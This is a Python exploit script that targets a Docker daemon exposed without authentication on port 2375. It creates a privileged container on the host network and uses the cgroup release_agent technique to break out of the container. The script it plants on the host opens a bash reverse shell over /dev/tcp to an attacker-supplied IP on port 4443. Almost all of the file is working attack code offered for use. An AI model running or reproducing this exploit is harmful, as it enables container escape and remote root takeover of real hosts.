# Python script to exploit the Docker daemon and get RCE

import docker
import time


def main():
    global host_ip, target_ip
    host_ip = input('Enter host IP: ')
    target_ip = input('Enter target IP: ')
    exploit()


def exploit():
    # sets IP to connect to Docker Daemon
    client = docker.DockerClient(base_url='tcp://' + target_ip + ':2375')

    # create privileged ubuntu container that stays open / waits for commands
    print("Creating malicious container")
    client.containers.run(image='ubuntu', command='bash', name='ubuntu', privileged=True, remove=True, detach=True, tty=True, stdin_open=True, network_mode="host")
    print("Container created")

    # create container object
    container = client.containers.get('ubuntu')

    time.sleep(1)
    print('test command 1')
    container.exec_run(cmd="bash -c 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x'")

    time.sleep(1)
    print('test command 2')
    container.exec_run(cmd="bash -c 'echo 1 > /tmp/cgrp/x/notify_on_release'")

    time.sleep(1)
    print('test command 3')
    container.exec_run(cmd='''bash -c "host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` && echo "$host_path/cmd" > /tmp/cgrp/release_agent"''')

    time.sleep(1)
    print('test command 4')
    container.exec_run(cmd='''bash -c "touch /cmd && echo '#!/bin/bash' >> /cmd"''')

    time.sleep(1)
    print('test command 5')
    container.exec_run(cmd="""bash -c 'echo "bash -i >& /dev/tcp/""" + host_ip + """/4443 0>&1" >> /cmd'""")

    time.sleep(1)
    print('test command 6')
    container.exec_run(cmd='chmod a+x /cmd')

    time.sleep(1)
    print('test command 7')
    container.exec_run(cmd="""bash -c 'sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"'""")


def container_list():
    # sets IP to connect to Docker Daemon
    client = docker.DockerClient(base_url=target_ip)

    # list every container of client
    for container in client.containers.list(all):
        print('Container name: {} | Container ID: {} | Status: {}'.format(container.name, container.short_id, container.status))


main()
